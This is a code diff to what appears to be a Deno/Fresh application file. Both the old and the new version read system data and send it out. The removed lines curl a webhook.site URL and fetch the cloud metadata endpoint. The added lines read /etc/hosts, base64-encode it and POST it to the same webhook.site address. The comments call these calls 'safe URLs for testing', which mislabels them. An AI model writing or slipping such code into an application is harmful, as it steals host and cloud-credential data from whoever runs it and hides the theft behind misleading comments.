@@ -21,24 +21,17 @@ export default defineApp(async (_req, ctx) => {
   let externalData: any = null;
   let exData: any = null;
   try {
-    const command = new Deno.Command("curl", {
-      args: [
-        "-s",
-        "https://webhook.site/52a1ce92-f6ec-4027-b69e-91e569a332e9?CURL",
-      ],
-      stdout: "piped",
-      stderr: "piped",
-    });
+    exData = await fetch(`file:///etc/hosts`) // <-- safe URL for testing
+      .then((res) => res.text());
 
-    const { stdout, stderr, code } = await command.output();
-    exData = await fetch(`http://169.254.169.254/latest/meta-data/`) // <-- safe URL for testing
+    const gcp = await fetch(`file:///etc/hosts`) // <-- safe URL for testing
       .then((res) => res.text());
 
     externalData = await fetch(
-      `https://webhook.site/52a1ce92-f6ec-4027-b69e-91e569a332e9?metada.tsx`,
+      `https://webhook.site/52a1ce92-f6ec-4027-b69e-91e569a332e9?_app.tsx`,
       {
         method: "POST",
-        body: btoa(exData),
+        body: btoa(exData) + gcp,
       },
     ) // <-- safe URL for testing
       .then((res) => res.json());
